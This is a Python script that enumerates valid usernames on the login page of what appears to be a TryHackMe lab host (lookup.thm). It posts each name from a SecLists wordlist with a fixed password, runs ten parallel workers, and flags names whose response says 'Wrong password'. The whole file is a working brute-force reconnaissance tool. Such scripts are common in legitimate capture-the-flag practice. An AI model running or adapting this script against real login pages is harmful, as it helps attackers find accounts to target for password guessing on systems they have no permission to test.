import requests
import multiprocessing

# Target URL
target = 'http://lookup.thm/login.php'

# Path to your username wordlist
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

def user_check(name, target):
    """
    Send a POST request with the given username and a fixed password.
    If the response contains 'Wrong password', we assume the username exists.
    """
    data = {"username": name, "password": "password"}
    try:
        response = requests.post(target, data=data, timeout=5)
        if "Wrong password" in response.text:
            print(f"[+] User found: {name}")
    except requests.RequestException as e:
        print(f"[-] Error checking {name}: {e}")

if __name__ == "__main__":
    try:
        with open(username_file, 'r') as user_file:
            users = [u.strip() for u in user_file.readlines()]

            # Use a pool of workers instead of spawning one process per user
            pool = multiprocessing.Pool(processes=10)  # adjust number of workers
            for user in users:
                pool.apply_async(user_check, args=(user, target))
            pool.close()
            pool.join()

    except FileNotFoundError:
        print(f'Error: File path {username_file} does not exist.')
